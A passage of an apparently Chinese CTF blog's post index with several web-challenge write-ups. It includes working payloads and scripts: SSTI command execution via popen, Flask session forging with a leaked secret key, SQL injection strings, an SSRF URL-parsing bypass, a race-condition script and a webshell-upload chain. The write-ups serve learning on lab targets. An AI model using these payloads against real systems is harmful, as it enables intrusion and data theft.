buyswitch(n): url = &quot;https://birthday.liki.link/API/?m=buy&quot; data = {&quot;amount&quot;: 26} headers = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#39;, &#39;Cookie&#39;: &#39;PHPSESSID=qdacrahf4gvn2o9q8aa4vm46jb&#39; #改成你自己的 } r = requests.post(url=url,headers=headers,data=data) print(&#39;线程&#39;+ str(n) + &#39;:&#39; + str(r.status_code) ) print (r.text) def thread(n): threads = [] for i in range(0, n): t = threading.Thread(target=buyswitch, args=(i,)) threads.append(t) print(threads) for t in threads: t.start() for t in threads: t.join() thread(2) hgame{L0ck_1s_TH3_S0lllut!on!!!}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[PwnThyBytes 2019]Baby_SQL","slug":"PwnThyBytes-2019-Baby-SQL","date":"2021-02-06T12:01:00.000Z","updated":"2021-02-06T09:03:37.842Z","comments":true,"path":"2021/02/06/PwnThyBytes-2019-Baby-SQL/","link":"","permalink":"/2021/02/06/PwnThyBytes-2019-Baby-SQL/","excerpt":"","text":"注释里提示source.zip源码泄露。 首先在index.php看到filter函数对每一个变量都进行了转义，所以不存在注入点。 register.php login.php 都没有过滤，但是可以看到都不能直接访问，需要传入session。 在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start() import requests url = &quot;http://87e4b96f-0493-4255-9fe6-e0c49874f234.node3.buuoj.cn/templates/login.php&quot; files = {&quot;file&quot;: &quot;123456789&quot;} a = requests.post(url=url, files=files, data={&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;}, cookies={&quot;PHPSESSID&quot;: &quot;test1&quot;}, params={&#39;username&#39;: &#39;test&#39;, &#39;password&#39;: &#39;test&#39;}, proxies={&#39;http&#39;: &quot;http://127.0.0.1:8080&quot;}) print(a.text) 伪造成功，有回显了。接下来直接盲注就行，这样就饶过了index的过滤。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"HGAME-Web-Week1WP","slug":"HGAME-Web-Week1WP","date":"2021-02-06T12:00:00.000Z","updated":"2021-02-06T08:08:18.928Z","comments":true,"path":"2021/02/06/HGAME-Web-Week1WP/","link":"","permalink":"/2021/02/06/HGAME-Web-Week1WP/","excerpt":"","text":"一、Hitchhiking_in_the_Galaxy 抓包我要搭顺风车 显示405 Method Not Allowed，burp改请求方式为POST 改User-Agent: Infinite Improbability Drive 改Referer: https://cardinal.ink/ 改X-Forwarded-For: 127.0.0.1 二、watermelon project.js修改每次合成增加的分数即可，或者改每次都掉大西瓜，解法很多。 三、宝藏走私者 https://paper.seebug.org/1048 四、智商检测鸡 根据session判断solve的数量，由于不知道密钥，所以无法直接伪造，只能写个脚本自动做题。写脚本的时候注意cookie的变化即可。 #!/usr/bin/python3 # @Author: Troy3e import requests import re import json url1 = &#39;http://r4u.top:5000/api/getQuestion&#39; url2 = &#39;http://r4u.top:5000/api/getStatus&#39; url3 = &#39;http://r4u.top:5000/api/verify&#39; url4 = &#39;http://r4u.top:5000/api/getFlag&#39; hea = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36&#39; } hea2 = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36&#39;, &#39;Content-Type&#39;: &#39;application/json&#39; } a = 1 while 1: source1 = requests.get(url=url2,headers=hea) source1.encoding = &#39;utf-8&#39; if a==1: cookie = source1.headers[&#39;Set-Cookie&#39;] res = source1.text print(res) hea = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36&#39;, &#39;Cookie&#39;: cookie } hea2 = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36&#39;, &#39;Content-Type&#39;: &#39;application/json&#39;, &#39;Cookie&#39;: cookie } if &#39;{&quot;solving&quot;:99}&#39; in res: source4 = requests.get(url=url4,headers=hea) print(source4.text) break source2 = requests.get(url=url1,headers=hea) source2.encoding = &#39;utf-8&#39; ques = source2.text num = re.findall(&quot;\\d+&quot;,ques) a = int(num[1]) b = int(num[2]) c = int(num[3]) d = int(num[4]) tmpresult = c / 2 * b * b + d * b - c / 2 * a * a + d * a result1 = {&quot;answer&quot;:tmpresult} result = json.dumps(result1) print(result) source3 = requests.post(url=url3,headers=hea2,data=result) print(source3.text) cookie = source3.headers[&#39;Set-Cookie&#39;] a=a+1 五、走私者的愤怒","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[MRCTF2020]Ezpop_Revenge","slug":"MRCTF2020-Ezpop-Revenge","date":"2021-02-02T06:10:03.000Z","updated":"2021-02-03T12:53:15.355Z","comments":true,"path":"2021/02/02/MRCTF2020-Ezpop-Revenge/","link":"","permalink":"/2021/02/02/MRCTF2020-Ezpop-Revenge/","excerpt":"","text":"看题目可知pop链，这种题目一般是逻辑漏洞，所以必定是会给源码，直接www.zip拿到源码。 flag.php remote_addr 无法伪造ip 只能找ssrf的点 访问成功后flag写入session。 于是全局查找session_start Plugin.php中的核心代码如下： &lt;?php class HelloWorld_DB{ private $flag=&quot;MRCTF{this_is_a_fake_flag}&quot;; private $coincidence; function __wakeup(){ $db = new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]); } } class HelloWorld_Plugin implements Typecho_Plugin_Interface { public function action(){ if(!isset($_SESSION)) session_start(); if(isset($_REQUEST[&#39;admin&#39;])) var_dump($_SESSION); if (isset($_POST[&#39;C0incid3nc3&#39;])) { if(preg_match(&quot;/file|assert|eval|[`\\&#39;~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST[&#39;C0incid3nc3&#39;])) === 0) unserialize(base64_decode($_POST[&#39;C0incid3nc3&#39;])); else { echo &quot;Not that easy.&quot;; } } } } 可以看到当传入admin时，输出session，而flag就在session中。同时还存在C0incid3nc3反序列化的点。 上面有个wakeup魔法函数，实例化了Typecho_Db函数，跟进。 没找到Typecho_Db.php，仔细看了下居然是/var/IXR/Typecho/Db.php。。。 又是一长串代码，幸好出题人给了提示： 全局搜索tostring函数，在/var/IXR/Typecho/Db/Query.php中有__tostring方法 假设$this-&gt;_sqlPreBuild[‘action’]为SELECT，在__toString()方法内就会返回$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)，调用了$this-&gt;_adapter的parseSelect()方法我们发现这个值我们也是可控的，这个时候我们控制_adapter为soap类就可以了 POP链：首先时/usr下的Plugins.php反序列化调用HelloWorld_DB触发Typecho_Db类，并且可以控制其中的$adapterName$adapterName拼接到字符串中，触发__tostring，所以这个时候我们使得$adapterName为Query.php中的Typecho_Db_Query类，并且控制私有变量$_adapter为soap类来本地访问flag.php 后面exp抄的y1ng师傅的，暂时没完全理解，就不写了。 https://blog.csdn.net/qq_45691294/article/details/109129120 https://blog.csdn.net/a3320315/article/details/105215741/","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"October 2019 Twice SQL Injection","slug":"October-2019-Twice-SQL-Injection","date":"2021-01-31T13:16:29.000Z","updated":"2021-02-01T15:46:12.712Z","comments":true,"path":"2021/01/31/October-2019-Twice-SQL-Injection/","link":"","permalink":"/2021/01/31/October-2019-Twice-SQL-Injection/","excerpt":"","text":"水了一题，本来以为这题挺难的想写篇博客，没想到是个送的二次注入。。 0’ union select flag from flag# zzz","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[FBCTF2019]Event","slug":"FBCTF2019-Event","date":"2021-01-29T07:07:17.000Z","updated":"2021-01-29T07:57:32.672Z","comments":true,"path":"2021/01/29/FBCTF2019-Event/","link":"","permalink":"/2021/01/29/FBCTF2019-Event/","excerpt":"","text":"随便注册个号（admin不行），试了下ssti不行。访问/flag需要admin的身份，所以寻找一下判断的标准是啥，首先抓包看下cookie之类的： 果然有，估计是要伪造user那里的东西，但是加密方式和密钥均未知。卡住了，于是回头看之前那个可能是ssti的点，只有通过ssti读取密钥伪造cookie才有解，所以一定是存在ssti的。 通过测试，使用class或者dict在event_important处可以爆出相关内容 得到密钥，接下来伪造就行了： flask原理：json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息 exp： from flask import Flask from flask.sessions import SecureCookieSessionInterface app = Flask(__name__) app.secret_key = b&#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#39; session_serializer = SecureCookieSessionInterface().get_signing_serializer(app) @app.route(&#39;/&#39;) def index(): print(session_serializer.dumps(&quot;admin&quot;)) index()","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[HarekazeCTF2019]Sqlite Voting","slug":"HarekazeCTF2019-Sqlite-Voting","date":"2021-01-26T07:38:11.000Z","updated":"2021-01-27T16:30:44.683Z","comments":true,"path":"2021/01/26/HarekazeCTF2019-Sqlite-Voting/","link":"","permalink":"/2021/01/26/HarekazeCTF2019-Sqlite-Voting/","excerpt":"","text":"由schema.sql可知flag在flag表里，update有不同的回显，猜测可以盲注。虽然引号和char都被ban了，但还能用hex。 先考虑对 flag 16 进制长度的判断，假设它的长度为 x，y 表示 2 的 n 次方，那么 x&amp;y 就能表现出 x 二进制为 1 的位置，将这些 y 再进行或运算就可以得到完整的 x 的二进制，也就得到了 flag 的长度，而 1&lt;&lt;n 恰可以表示 2 的 n 次方 如何构造报错就不知道了，看了wp知道是sqlite3的一个特性：在 sqlite3 中，abs 函数有一个整数溢出的报错，如果 abs 的参数是 -9223372036854775808 就会报错，同样如果是正数也会报错。 判断flag长度： 接下来一个个进行判断，但是 is_valid() 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断。 不会，参考wp。 这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 ABCDEF ，这样十六进制的所有字符都可以使用了，并且使用 trim(0,0) 来表示空字符。 # hex(b&#39;zebra&#39;) = 7A65627261 # 除去 12567 就是 A ，其余同理 A = &#39;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#39; C = &#39;trim(hex(typeof(.1)),12567)&#39; D = &#39;trim(hex(0xffffffffffffffff),123)&#39; E = &#39;trim(hex(0.1),1230)&#39; F = &#39;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#39; # hex(b&#39;koala&#39;) = 6B6F616C61 # 除去 16CF 就是 B B = f&#39;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{C}||{F})&#39; 懒得写脚本，嫖了一个 HarekazeCTF2019 Web全部WP参考：https://xz.aliyun.com/t/6628","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"封神台靶场WP","slug":"封神台靶场WP","date":"2021-01-21T12:33:08.000Z","updated":"2021-01-23T08:49:27.244Z","comments":true,"path":"2021/01/21/封神台靶场WP/","link":"","permalink":"/2021/01/21/封神台靶场WP/","excerpt":"","text":"一个比较基础的靶场，记录一下做题过程。 第一章一个没过滤的sql注入 最终payload：http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,group_concat(password)%20from%20admin 数字型的比较少见，因为不像单引号型那样有引号’分割开，所以要加上1 and 1=2，1=2的原因和单引号型前面0’是一个道理，就不细说了。 第二章这关卡了。。。一直想的绕过waf但是绕不过。。看了wp发现是在cookie里面注。。。 171%20union%20select%201,2,3,4,5,6,7,8,9,10%20from%20admin 第三章拿了flag一直显示不对。。。不做了 这靶场感觉质量一般般，不建议打。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"redis安全学习笔记&[网鼎杯 2020 玄武组]SSRFMe","slug":"网鼎杯-2020-玄武组-SSRFMe","date":"2021-01-17T05:13:11.000Z","updated":"2021-01-17T15:15:13.822Z","comments":true,"path":"2021/01/17/网鼎杯-2020-玄武组-SSRFMe/","link":"","permalink":"/2021/01/17/网鼎杯-2020-玄武组-SSRFMe/","excerpt":"","text":"前几个月有个比赛有类似的一道题，当时百度了一个payload没来得及去深究，今天正好又遇到了，简单分析一下。 &lt;?php function check_inner_ip($url) { $match_result=preg_match(&#39;/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/&#39;,$url); if (!$match_result) { die(&#39;url fomat error&#39;); } try { $url_parse=parse_url($url); } catch(Exception $e) { die(&#39;url fomat error&#39;); return false; } $hostname=$url_parse[&#39;host&#39;]; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; } function safe_request_url($url) { if (check_inner_ip($url)) { echo $url.&#39; is inner ip&#39;; } else { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info[&#39;redirect_url&#39;]) { safe_request_url($result_info [&#39;redirect_url&#39;]); } curl_close($ch); var_dump($output); } } if(isset($_GET[&#39;url&#39;])){ $url = $_GET[&#39;url&#39;]; if(!empty($url)){ safe_request_url($url); } } else{ highlight_file(__FILE__); } // Please visit hint.php locally. ?&gt; 两个函数，check_inner_ip($url)检测你是不是内网ip，safe_request_url($url)在判断你不是内网ip之后就可以执行一系列命令。而题目提示必须本地访问hint.php。这样看上去似乎没有漏洞，无法读取hint.php，但这里有一个注意点： curl 和 php_url_parse 处理后最终的目标不一样，curl认为evil.com:80是目标而parse_url认为google.com是目标.作者向 curl 团队报告了这个问题，得到了一个补丁，但是补丁又可以通过空格的方式绕过。 预期：url=http://caiji@127.0.0.1:80 @baidu.com/hint.php但是这预期我打不出来不知道啥原因，所以就用了非预期非预期：url=http://0.0.0.0/hint.php //0.0.0.0 代表本机ipv4 的所有地址 后面是一个redis主从复制，会用就行。 https://blog.csdn.net/qq_43756333/article/details/107536521 接下来了解一下redis。 Redis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Java，C/C++，C#，PHP，JavaScript，Perl，Object-C，Python，Ruby，Erlang等客户端，使用很方便。 Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。 浅析SSRF认证攻击Redis：https://www.smi1e.top/%E6%B5%85%E6%9E%90ssrf%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BBredis/","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[pasecactf_2019]flask_ssti","slug":"pasecactf-2019-flask-ssti","date":"2021-01-15T03:30:45.000Z","updated":"2021-01-15T08:21:53.722Z","comments":true,"path":"2021/01/15/pasecactf-2019-flask-ssti/","link":"","permalink":"/2021/01/15/pasecactf-2019-flask-ssti/","excerpt":"","text":"一道没什么过滤的ssti。 {{()[\"\\x5f\\x5fclass\\x5f\\x5f\"][\"\\x5f\\x5fmro\\x5f\\x5f\"][1][\"\\x5f\\x5fsubclasses\\x5f\\x5f\"]()[127][\"\\x5f\\x5finit\\x5f\\x5f\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"popen\"](\"cat%20app\\x2epy\")[\"read\"]()}} 找到os读源码经过encode的flag在config里面： 然后根据得到的源码反推即可。 flag{5a4300b4-09b3-4c56-a06d-fcda5bbfd765}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"2020-2021寒假计划","slug":"2020-2021寒假计划","date":"2021-01-13T14:05:01.000Z","updated":"2021-01-13T14:12:27.446Z","comments":true,"path":"2021/01/13/2020-2021寒假计划/","link":"","permalink":"/2021/01/13/2020-2021寒假计划/","excerpt":"","text":"期末终于考完了，大概一个月没碰CTF，寒假得好好学习了： 1、每天两道BUU的新题和两道老题。2、找一些靶场练习3、完成QQ机器人自定义4、多打比赛 ccc","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"《关于SWPU2020被虐爆这件事》","slug":"《关于SWPU2020被虐爆这件事》","date":"2020-12-15T13:42:05.000Z","updated":"2020-12-15T14:56:52.945Z","comments":true,"path":"2020/12/15/《关于SWPU2020被虐爆这件事》/","link":"","permalink":"/2020/12/15/《关于SWPU2020被虐爆这件事》/","excerpt":"","text":"忘了是啥时候的比赛了，好像有一阵子了。本次比赛光荣地0解了。花了很长时间做了一道赛后0解的题。。。这次Web确实很难，必须好好学习一下。由于时间隔得比较久环境已经关了，所以就靠印象复现几道简单的题。官方WP：https://wllm1013.github.io/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/ 一、359度防护网站这道题我被坑了。进去是一个花里胡哨的网站，转了几圈没发现利用点，随手试了一下robots.txt发现居然有提示administrator.html，访问是个登录框，还写着千万不要扫。然而我还真没扫直接当sql注入做的，做的直接心态爆炸，这有个锤子注入点？然后看了WP发现还有个index.php.bak。。。说是常见遗留文件。。。我要是扫了那就是另一个故事了QAQ。 根据index.php.bak里面的提示访问important_index_its_so_long_right.php?id=1 页面，然后联合注入就可以直接得出所有数据库名，表，字段及内容 这里的注入没什么难的 利用注出来的账号密码登进去administrator.html，访问注释里面泄露的日志记录从而发现up_lo_ad_ad_min.php页面 00001登录，最后是一个上传点。但是是个白名单所以理论上就没用，具体如下方官方WP图。 好家伙，要是我估计也卡在上传界面了，这个两个联合起来用的脑洞也tql。 二、sqlsqlsql基本上一直在做这道题，赛后发现是0解。 时间盲注无疑，但是黑名单我测出来的好像有问题，所以一开始就进入了误区。 真实的黑名单。太菜了，黑名单我就死了，当时也记不清了，好像除了空格都没回显啊？ 官方给的注意点： 除了第三点别的都知道，但是第三点当作hint放出来的时候已经很晚了。因为是0解官方也没给脚本，只给了两个payload提示： http://182.150.46.187:8801/ttttt/?id=1&#39;^(select(case&#39;1&#39;when((select(select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema=database()))regexp&quot;flllag&quot;))then&#39;1&#39;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#39;1 http://182.150.46.187:8801/ttttt/?id=1&#39;^(select(case&#39;1&#39;when((select(select(group_concat(`2`))from(select*from(select(1))as`a`join(select(2))as`b`union(select*from(flllag)))as`a`)regexp&quot;flag{aaa&quot;))then&#39;1&#39;else(select(count(*))from((mysql.help_relation)join(mysql.help_topic)join(mysql.proc)))end))^&#39;1 估计师傅们都是sleep和benckmark没了不知道咋办了，因为本题如果没有这个点的话我应该都能做出来了。 今天先写到这，还有的没写的下次继续。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[CSAWQual 2016]i_got_id","slug":"CSAWQual-2016-i-got-id","date":"2020-12-12T14:03:27.000Z","updated":"2020-12-12T16:19:59.055Z","comments":true,"path":"2020/12/12/CSAWQual-2016-i-got-id/","link":"","permalink":"/2020/12/12/CSAWQual-2016-i-got-id/","excerpt":"","text":"最近有点划水 补了好多番 今天正好考完六级 定个期末复习间的目标：两天一道题。还有swpu的题还没复现，先记着吧。 这道题有三个界面一个helloworld一个注入一个上传 看了一堆人的wp，又是一模一样。越往后做网上的wp质量就越差，基本上都是模仿，没有自己的思考。 本题buu给出了源码，而网上一堆人声称根据页面就猜出源码，如果是大佬那暂且不谈，但猜出来的源码居然也是一个字母不差。。。 首先本题有两个比较陌生的概念。1、cgiCGI 是Web 服务器运行时外部程序的规范,按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与浏览器进行交互,还可通过数据库API 与数据库服务器等外部数据源进行通信,从数据库服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库中。几乎所有服务器都支持CGI,可用任何语言编写CGI,包括流行的C、C ++、VB 和Delphi 等。CGI 分为标准CGI 和间接CGI两种。标准CGI 使用命令行参数或环境变量表示服务器的详细请求，服务器与浏览器通信采用标准输入输出方式。间接CGI 又称缓冲CGI,在CGI 程序和CGI 接口之间插入一个缓冲程序，缓冲程序与CGI 接口间用标准输入输出进行通信。2、perl一种语言 然后先看上传界面，和网上一个wp中一样，估计一般人都不喜欢注入 源码很简单，没有什么黑名单白名单，那么如果有漏洞的话肯定是函数本身的问题。经过测试发现会返回上传文件的源码。（有的wp说是根据这一点推测出来param()函数以及源码的）。接着网上查一下param()函数，但是百度上并没有找到利用方法。（懒狗懒得去谷歌） 查阅WP：param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 ARGV的具体含义： 意思是后面的文件都是第一项（现在是个数组）中的内容 所以burp抓包，url后面加?/flag（这里我是看了github的源码才知道flag在/flag，不知道网上各路大神未作任何说明是啥意思）。同时随便上传一个文件就行 注：content-type这里也是可以随便改的。但是ARGV的那个filename一定给给他去掉，不然就变成传的文件内容是ARGV的，记住这里ARGV是个参数","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[watevrCTF-2019]Supercalc","slug":"watevrCTF-2019-Supercalc","date":"2020-12-09T11:40:11.000Z","updated":"2020-12-09T12:02:44.751Z","comments":true,"path":"2020/12/09/watevrCTF-2019-Supercalc/","link":"","permalink":"/2020/12/09/watevrCTF-2019-Supercalc/","excerpt":"","text":"计算器类型的题目，一般都是ssti。题目给出了github的源码，不知道比赛的时候是不是这样的，给出来之后整道题变得非常简单。如下图所示，直接给出了secretkey和命令执行点。 首先随便刷新一下看一下给的session： 结合源码可知会执行code里面的内容，然后我们又掌握了secretkey，那么就可以伪造session执行命令了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"博客优化","slug":"博客优化","date":"2020-12-05T16:49:15.000Z","updated":"2020-12-05T16:57:28.852Z","comments":true,"path":"2020/12/06/博客优化/","link":"","permalink":"/2020/12/06/博客优化/","excerpt":"","text":"懒狗时隔一年终于想起来翻修下博客。今日更新如下 一、开放评论功能现在可以愉快地交流了哦~ 二、歌单更新网易云歌单换成我自己的了。 三、首页视频更新QAQ 四、文章置顶 五、实现bilibili外链如置顶文章。 六、背景优化去除了网格，现在是原图 七、杂项去除了没用的小标签 未完成的：文章标题部分的背景 最后就是暂停更博声明：期末考试一个月，可能不怎么会更新。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GWCTF 2019]你的名字","slug":"GWCTF-2019-你的名字","date":"2020-11-29T13:02:31.000Z","updated":"2020-11-29T13:47:20.129Z","comments":true,"path":"2020/11/29/GWCTF-2019-你的名字/","link":"","permalink":"/2020/11/29/GWCTF-2019-你的名字/","excerpt":"","text":"此题对我来说意义重大： 一是因为宫水三叶是我老婆（，二是因为这是dd在buu上的最后一个一分题了！数了一下，161道题，从上学期做到现在，属实快乐（大一下学期我划水了我是废物QAQ有一说一，圈子里能刷完buu所有一分题的Web选手，至少也不算个萌新了，但为什么我还是啥都不会呢，呜呜呜。要是有一天能y1ng那种大师傅一样强就好了（活在梦里 好了下面开始愉快的解题： 尝试传入config发现被置为空，if也会被置为空，os也会被置为空。。。。尝试传入coniffig绕过过滤，失败尝试传入conosfig绕过过滤，失败尝试传入iconfigf绕过过滤，成功仔细想了想觉得就应该直接尝试这种，因为config不怎么使用，而其他的函数优先级都比他高，所以逻辑上来讲应该直接尝试这种。 君の名は！","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"安洵杯2020-Bash&Normal SSTI","slug":"安洵杯2020-Bash-Normal-SSTI","date":"2020-11-28T15:28:35.000Z","updated":"2020-11-28T15:30:18.203Z","comments":true,"path":"2020/11/28/安洵杯2020-Bash-Normal-SSTI/","link":"","permalink":"/2020/11/28/安洵杯2020-Bash-Normal-SSTI/","excerpt":"","text":"安洵杯2020-Bash&amp;Normal SSTI 一、Bash早上实验课瞅了一眼，第一感觉是挺简单的，打算下午下课了把它c了。但是下午一看题解发现不对劲，怎么只有3解？大佬们都做不出来的东西肯定不简单，于是就放弃了。看了wp受益匪浅，确实是很少见的绕过，只能说师傅tql。linux的位运算以及进制的转换之前从来没见过： 二、Normal SSTI 这个ssti还没仔细研究，有空看下。也是从没出现过的一种方法。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[XDCTF 2015]filemanager","slug":"XDCTF-2015-filemanager","date":"2020-11-27T12:05:37.000Z","updated":"2020-11-28T15:36:13.781Z","comments":true,"path":"2020/11/27/XDCTF-2015-filemanager/","link":"","permalink":"/2020/11/27/XDCTF-2015-filemanager/","excerpt":"","text":"www.tar.gz泄露源码 还是比较明显的二次注入，因为最近做题的时候看源码都看得更细了些，所以这题写了两天（其实是昨天划水了，《你的名字。》太好哭了呜呜呜 简单总结一下此题原理，即利用二次注入，将extension后缀名置为空，由下图可知，白名单只会判断后缀名而不会判断文件名，所以我们就可以直接上传1.jpg.jpg即可。 解题： 1、首先上传一个文件名为：’,extension=’’,filename=’troye.jpg.jpg的文件，此时数据库中文件名为troye.jpg。至于为什么会执行，看源码可知在初次上传时addslashes函数对文件名进行了转义，所以单引号也被传进去了，而在rename时，调用oldname的时候由于单引号的存在就被代入执行了。这就不细说了，二次注入遇到好几次了。 2、重命名 3、上传一个真正带webshell的troye.jpg，然后再次重命名 注意在这里有个坑，这里改名的时候检查了文件是否存在：if(file_exists($oldname)) 虽然通过注入修改了filename的值，但我upload目录下上传的文件名是没有改的。 因为利用注入时将extension改为空了，那么实际上数据库中的filename总比文件系统中真实的文件名少一个后缀。 那么这里的file_exists就验证不过。这里可以通过再次上传一个新文件，这个文件名就等于数据库里的filename的值就即可绕过。 所以最后整个getshell的流程，实际上是一个二次注入+二次操作getshell。 4、getflag 1=system(‘cd ../../../../;cat f*’);","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"二次注入","slug":"二次注入","permalink":"/tags/二次注入/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GYCTF2020]Node Game-CRLF头部注入","slug":"GYCTF2020-Node-Game-CRLF头部注入","date":"2020-11-26T04:51:44.000Z","updated":"2020-11-26T06:28:55.596Z","comments":true,"path":"2020/11/26/GYCTF2020-Node-Game-CRLF头部注入/","link":"","permalink":"/2020/11/26/GYCTF2020-Node-Game-CRLF头部注入/","excerpt":"","text":"源码： var express = require(&#39;express&#39;); var app = express(); var fs = require(&#39;fs&#39;); var path = require(&#39;path&#39;); var http = require(&#39;http&#39;); var pug = require(&#39;pug&#39;); var morgan = require(&#39;morgan&#39;); const multer = require(&#39;multer&#39;); app.use(multer({dest: &#39;./dist&#39;}).array(&#39;file&#39;)); app.use(morgan(&#39;short&#39;)); app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#39;/uploads&#39;))) app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#39;/template&#39;))) app.get(&#39;/&#39;, function(req, res) { var action = req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;) ){ res.send(&quot;Errrrr, You have been Blocked&quot;); } file = path.join(__dirname + 